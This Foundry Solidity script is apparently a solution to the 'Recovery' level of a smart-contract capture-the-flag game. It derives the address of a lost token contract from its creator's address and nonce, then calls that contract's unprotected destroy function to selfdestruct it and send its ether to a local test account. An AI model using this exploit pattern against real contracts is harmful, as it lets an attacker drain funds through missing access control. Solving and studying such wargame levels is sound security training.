// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {Recovery, SimpleToken} from "../src/L17Recovery.sol";

// 0xeC4cFde48EAdca2bC63E94BB437BbeAcE1371bF3
contract L17RecoveryAttack is Broadcast {
    Recovery recover = Recovery(0xeC4cFde48EAdca2bC63E94BB437BbeAcE1371bF3);

    function run() public broadcast {
        SimpleToken tokenContract = SimpleToken(
            payable(
                address(
                    uint160(
                        uint256(
                            keccak256(
                                abi.encodePacked(
                                    bytes1(0xd6),
                                    bytes1(0x94),
                                    address(0xeC4cFde48EAdca2bC63E94BB437BbeAcE1371bF3),
                                    bytes1(0x01)
                                )
                            )
                        )
                    )
                )
            )
        );
        console.log("Before transfer", tokenContract.balances(0xeC4cFde48EAdca2bC63E94BB437BbeAcE1371bF3));

        tokenContract.destroy(payable(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266));

        console.log("After transfer", tokenContract.balances(0xeC4cFde48EAdca2bC63E94BB437BbeAcE1371bF3));
    }
}
